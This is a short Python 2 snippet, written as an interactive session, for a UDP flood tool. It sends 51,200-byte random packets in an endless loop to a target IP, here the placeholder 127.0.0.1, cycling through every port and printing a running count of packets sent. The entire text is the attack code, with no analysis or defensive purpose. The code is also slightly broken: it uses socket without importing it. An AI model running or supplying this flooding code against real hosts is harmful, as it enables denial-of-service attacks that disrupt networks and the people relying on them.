>>>import random
>>>rkt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
>>>bytes = random._urandom(51200)
>>>ip = "127.0.0.1"
>>>port = 80
>>>sent = 0
>>>while True:
>>> ... rkt.sendto(bytes,(ip,port))
>>> ... sent = sent + 1
>>> ... port = port + 1
>>> ... print "SENT %s PACKET TO %s THROUGHT PORT:%s" % (sent,ip,port)
>>> ... if port == 65535:
>>> ... port = 1